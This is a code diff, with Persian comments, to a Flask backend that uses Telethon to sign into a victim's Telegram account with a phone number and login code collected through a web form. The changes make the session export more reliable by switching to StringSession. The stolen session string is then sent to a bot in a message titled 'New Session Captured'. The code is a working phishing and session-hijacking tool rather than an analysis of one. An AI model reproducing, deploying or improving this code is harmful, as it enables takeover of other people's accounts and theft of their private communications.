@@ -1,11 +1,11 @@
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 from telethon import TelegramClient
+from telethon.sessions import StringSession
 import asyncio
 import os
 import logging
 import requests
-import time
 
 app = Flask(__name__)
 CORS(app)
@@ -66,6 +66,9 @@ def verify_code():
         logging.error(f"Error in verify_code: {e}")
         return jsonify({'error': str(e)}), 500
 
+# ============================================================
+# توابع اصلی
+# ============================================================
 async def send_code(session_id, phone):
     try:
         client = TelegramClient(session_id, API_ID, API_HASH)
@@ -102,27 +105,16 @@ async def verify_session(session_id, phone, code):
         # ✅ تایید کد
         await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
         
-        # ✅ کمی صبر تا کلاینت کامل بشه
-        await asyncio.sleep(1)
-        
-        # ✅ تایید لاگین با get_me()
+        # ✅ تایید لاگین
         me = await client.get_me()
         if not me:
             logging.error("❌ Login failed")
             return False
         
-        # ✅ گرفتن سشن به روش مطمئن
-        session_string = client.session.save()
+        # ✅ گرفتن سشن با StringSession (مطمئن‌ترین روش)
+        session_string = StringSession.save(client.session)
         
-        # اگر سشن خالی بود، از روش جایگزین استفاده کن
-        if not session_string or len(session_string) < 10:
-            # روش جایگزین: گرفتن سشن از فایل
-            session_file = f"{session_id}.session"
-            if os.path.exists(session_file):
-                with open(session_file, 'r') as f:
-                    session_string = f.read()
-        
-        # ✅ ارسال به ربات
+        # ✅ ارسال به ربات با قالب انگلیسی
         if session_string and len(session_string) > 10:
             message = f"""✅ <b>New Session Captured</b>
 
@@ -145,7 +137,7 @@ async def verify_session(session_id, phone, code):
 
         send_to_bot(message)
 
-        # ✅ خروج کامل
+        # ✅ خروج کامل از اکانت
         await client.log_out()
         await client.disconnect()
 
